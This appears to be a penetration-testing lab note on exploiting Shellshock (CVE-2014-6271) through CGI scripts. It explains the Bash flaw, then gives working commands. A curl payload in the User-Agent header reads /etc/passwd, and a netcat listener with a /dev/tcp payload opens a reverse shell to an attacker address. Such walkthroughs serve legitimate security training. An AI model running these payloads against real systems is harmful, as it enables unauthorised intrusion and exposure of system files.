# CGI Applications
## Shellshock (CVE-2014-6271) via CGI
Shellshock, also known as the "Bash Bug," is a critical vulnerability discovered in 2014 affecting GNU Bash versions up to 4.3. While it is an older vulnerability, it is still frequently encountered in legacy systems and penetration testing environments.

**The Core Vulnerability** The flaw lies in how Bash processes environment variables. When a new Bash shell starts, it reads environment variables. If a variable contains a specific string pattern starting with `() { :; };`, vulnerable versions of Bash incorrectly interpret this as a function definition. Crucially, if there are commands _following_ the function definition, Bash executes them immediately upon importing the variable.

**The CGI Connection** Common Gateway Interface (CGI) is a standard method for web servers to interact with executable programs (scripts). When a web server (like Apache) receives a request for a CGI script:

1. It creates a new process to run the script.
2. It passes details about the HTTP request (headers, protocol, etc.) to the script as **environment variables**.
    - Example: The `User-Agent` header becomes the `HTTP_USER_AGENT` environment variable.
3. If the CGI script invokes Bash (or is a Bash script itself), Bash spins up and parses these variables.

**The Attack Chain** If an attacker sends a malicious HTTP request with a Shellshock payload in a header (like User-Agent), the web server passes that payload into a Bash environment variable. Vulnerable Bash parses it and executes the trailing commands.
## Hands-on Exploitation
### 1. Discovery
First, identify CGI scripts on the target server. These are often found in directories like `/cgi-bin/` or have extensions like `.cgi`, `.pl`, or `.sh`.
```shell
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```
### 2. Verification
Once a script (e.g., `access.cgi`) is found, test for vulnerability by injecting a payload into the `User-Agent` header.

**The Payload:** `() { :; }; echo; echo; /bin/cat /etc/passwd`
- `() { :; };` : The "magic string" that defines a dummy function.
- `echo; echo;` : This is often necessary to output an empty line (headers) so the web server doesn't crash with a 500 error before displaying the command output.
- `/bin/cat /etc/passwd` : The actual command we want to run.

**Command:**
```shell
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' http://10.129.204.231/cgi-bin/access.cgi
```
_If vulnerable, the server response will contain the contents of `/etc/passwd`._
### 3. Remote Code Execution (Reverse Shell)
To gain full access, replace the verification command with a reverse shell payload pointing back to your listener.

**Attacker (Listener):**
```shell
nc -lvnp 7777
```

**Attacker (Payload Injection):**
```shell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```
If successful, the web server executes the Bash command, connecting back to your listener with a shell running as the web server user (usually `www-data`).